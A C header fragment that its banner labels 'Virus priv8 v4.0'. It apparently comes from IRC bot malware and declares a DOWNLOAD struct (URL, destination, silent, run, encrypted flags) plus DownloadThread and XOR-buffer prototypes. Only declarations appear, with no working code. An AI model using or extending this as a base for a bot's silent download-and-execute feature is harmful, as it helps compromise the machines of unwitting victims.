/*     
///////////////////////////////////////////////////////        
													 ./
 XXXXXXX   XXXXXXX XXXXXXXXXX   XXXXXXXX  XXXXXXXX   ./
  	XXXX   XXXX    XXXX   XXX      XXXXX  XXXXX      ./
	 XXXX XXXX     XXXX  XXXX       XXXX  XXXX       ./
	  XXXXXXX	   XXXXXXXXX         XXXXXXXX        ./
	   XXXXX       XXXX   XXX       XXXX XXXXX       ./
        XXX        XXXX   XXXX     XXXXX  XXXXX      ./
         X         XXXX   XXXXX XXXXXXXX  XXXXXXXX   ./
............................zerX,Virus priv8......v4.0/
///////////////////////////////////////////////////////

*/
#ifndef NO_DOWNLOAD
// download/update structure
typedef struct DOWNLOAD 
{
	SOCKET sock;
	char chan[128];
	char url[256];
	char dest[256];
	int threadnum;
	int update;
	int run;
	unsigned long filelen;
	unsigned long expectedcrc;
	BOOL encrypted;
	BOOL silent;
	BOOL notice;
	BOOL gotinfo;

} DOWNLOAD;

DWORD WINAPI DownloadThread(LPVOID param);
char *Xorbuff(char *buffer,int bufferLen);
#endif
